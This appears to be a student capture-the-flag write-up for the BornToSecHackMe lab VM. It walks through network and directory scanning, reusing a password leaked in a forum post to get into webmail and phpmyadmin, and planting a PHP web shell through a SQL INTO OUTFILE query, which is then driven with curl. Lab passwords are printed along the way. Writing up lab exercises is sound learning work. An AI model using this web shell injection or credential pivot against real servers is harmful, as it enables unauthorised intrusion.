# Writeup1
First we set up our VM with a host-only network adapter, as to have an idea where we will need to look
## Where do we go
First nmap to see which port are available on the server

    ┌──(kali㉿kali)-[~]
	└─$ nmap 192.168.56.0/24
	Starting Nmap 7.93 ( https://nmap.org ) at 	2023-05-22 09:20 EDT
	Nmap scan report for 192.168.56.1
	Host is up (0.00020s latency).
	Not shown: 995 closed tcp ports (conn-refused)
	PORT     STATE SERVICE
	22/tcp   open  ssh
	111/tcp  open  rpcbind
	2049/tcp open  nfs
	5900/tcp open  vnc
	9100/tcp open  jetdirect

	Nmap scan report for 192.168.56.102
	Host is up (0.00021s latency).
	Not shown: 994 closed tcp ports (conn-refused)
	PORT    STATE SERVICE
	21/tcp  open  ftp
	22/tcp  open  ssh
	80/tcp  open  http
	143/tcp open  imap
	443/tcp open  https
	993/tcp open  imaps

	Nmap scan report for 192.168.56.103
	Host is up (0.00018s latency).
	All 1000 scanned ports on 192.168.56.103 are in ignored states.
	Not shown: 1000 closed tcp ports (conn-refused)

	Nmap done: 256 IP addresses (3 hosts up) scanned in 16.37 seconds
 192.168.56.102 is the IP address of our server, we see  that it has a website available in http and in https
 Let's try to go there: 
 ![http website](placeholder)
The http website seem unexploitable
And the https://192.168.56.102 is not found
Let's try dirb to see which directories are available on each:

    ┌──(kali㉿kali)-[~]
	└─$ dirb http://192.168.56.102

	-----------------
	DIRB v2.22    
	By The Dark Raver
	-----------------

	START_TIME: Mon May 22 09:27:31 2023
	URL_BASE: http://192.168.56.102/
	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

	-----------------

	                                                                             GENERATED WORDS: 4612

	---- Scanning URL: http://192.168.56.102/ ----
	                                                                             + http://192.168.56.102/cgi-bin/ 	(CODE:403|SIZE:290)                        
		                                                                             ==> DIRECTORY: http://192.168.56.102/fonts/
	+ http://192.168.56.102/forum (CODE:403|SIZE:287)                           
	+ http://192.168.56.102/index.html (CODE:200|SIZE:1025)                     
	+ http://192.168.56.102/server-status (CODE:403|SIZE:295)                   
                                                                            
	---- Entering directory: http://192.168.56.102/fonts/ ----
	                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                               
	-----------------
	END_TIME: Mon May 22 09:27:32 2023
	DOWNLOADED: 4612 - FOUND: 4
And Now with https:

    ┌──(kali㉿kali)-[~]
	└─$ dirb https://192.168.56.102

	-----------------
	DIRB v2.22    
	By The Dark Raver
	-----------------

	START_TIME: Mon May 22 09:31:15 2023
	URL_BASE: https://192.168.56.102/
	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

	-----------------

	                                                                             GENERATED WORDS: 4612

	---- Scanning URL: https://192.168.56.102/ ----	                                                                          + https://192.168.56.102/cgi-bin/ (CODE:403|SIZE:291)                       
	                                                                             ==> DIRECTORY: https://192.168.56.102/forum/
                                                                             ==> DIRECTORY: https://192.168.56.102/phpmyadmin/
	+ https://192.168.56.102/server-status (CODE:403|SIZE:296)                  
                                                                             ==> DIRECTORY: https://192.168.56.102/webmail/
                                                                            
	---- Entering directory: https://192.168.56.102/forum/ ----
                                                                             + https://192.168.56.102/forum/backup (CODE:403|SIZE:295)                   
	+ https://192.168.56.102/forum/config (CODE:403|SIZE:295)                   
                                                                             ==> DIRECTORY: 	https://192.168.56.102/forum/images/
                                                                             ==> DIRECTORY: https://192.168.56.102/forum/includes/
	+ https://192.168.56.102/forum/index (CODE:200|SIZE:4935)                   
	+ https://192.168.56.102/forum/index.php (CODE:200|SIZE:4935)               
                                                                             ==> DIRECTORY: https://192.168.56.102/forum/js/
                                                                             ==> DIRECTORY: https://192.168.56.102/forum/lang/
                                                                             ==> DIRECTORY: https://192.168.56.102/forum/modules/
                                                                             ==> DIRECTORY: https://192.168.56.102/forum/templates_c/
                                                                             ==> DIRECTORY: https://192.168.56.102/forum/themes/
                                                                             ==> DIRECTORY: https://192.168.56.102/forum/update/

## Website
We have a forum available,a webmail and phpmyadmin available on the 443 port, let's check the forum first:

We find a post labeled problem login? :
When we look into it we see that the user lmezard specified what looks like a password as a login, let's try it on the forum:

    Oct 5 08:45:29 BornToSecHackMe sshd[7547]: 	Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2  
	Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]  
	Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
![Login as mezard](Forum%20image)
It works and when you see the user page, we see an email:
laurie@borntosec.net

Let's try this email on the webmail we found earlier:
![Webmail](Webmail)
We try with the same password and it works ! Hourra !!!
Now we can check a very interessting mail labeled DB ACCESS
![DBACCESS](DBACESS)
This seems to be the loggin for phpmyadmin and it's the root user, it works.
## Backdoor
Now we can inject a backdoor in SQL, the only folder that we can write on is forum/templates_c
so let's do it:

	SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"

We can now launch our commands:

    curl --insecure https://192.168.56.102/forum/templates_c/backdoor.php?cmd=ls%20-al%20/home/LOOKATME 
We see a LOOKATME file in the /home folder:
We find it's the password for the ftp connection of user lmezard: G!@M6f4Eatau{sF"

We connect to the ftp server, we see a fun file we download it, then we see which type of file it is: it's a POSIX tar archive let's unzip it:

    tar -xvf fun
We get a folder name ft_fun with a lot of pcap files
We try a few commands to see what's inside we get something interesting with the following one:

    ┌──(kali㉿kali)-[~/Desktop/ft_fun]
    └─$ cat * | grep return               
    //file483       return 'a';
    //file697       return 'I';
            return 'w';
            return 'n';
            return 'a';
            return 'g';
            return 'e';
    //file161       return 'e';
    //file252       return 't';
    //file640       return 'r';
    //file369       return 'p';
    //file3 return 'h';
 By putting the ones with file in front in the correct order we get:

     Iheartpwnage 
 We try it directly and it doesn't work so let's encrypt it 
 SHA256 is the way to go:
 we get                       

    330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

Now we can connect to ssh on the machine:

    ssh laurie@<IP>
    password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
We are in.
We have a README file:

    HINT:
    P
     2
     b
    
    o
    4
    
    NO SPACE IN THE PASSWORD (password is case sensitive).

and a bomb binary
